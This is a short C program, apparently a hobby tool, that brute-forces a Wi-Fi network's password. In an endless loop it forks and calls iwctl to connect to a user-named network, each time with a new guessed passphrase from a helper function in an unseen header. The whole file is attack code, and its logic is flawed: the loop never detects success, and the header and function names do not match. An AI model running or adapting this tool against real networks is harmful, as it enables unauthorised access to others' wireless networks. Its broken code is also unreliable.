#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <time.h>
#include "crador.h"


int main(void) {

  /* Defining variables */
    char name[20];
    int n = -1;
    int lenght = 8;
    int attemp = 0;
    printf("Insert the network name: \n");
    scanf("%19[^\n]s", name); // Must change this, posible buffer overflow.

    while (n != 0) 
    {

      // Creating and verifing the fork.
      int  pid = fork();
      if (pid == -1) { 
        printf("Error, could not execute iwctl \n");
          return -1;
      }
      
      //Here starts the fun ;-)
      char finalpassword[lenght + 8];
      creador(&lenght, &attemp, finalpassword);
      if (pid != 0) { wait(NULL); }
      if (pid == 0) {
          int n = execlp("iwctl", "iwctl", "--passphrase", finalpassword, "station", "wlan0", "connect", name, NULL);
      perror("iwctl");
      _exit(1);
      }
      attemp ++;
    }
    return 0;
}
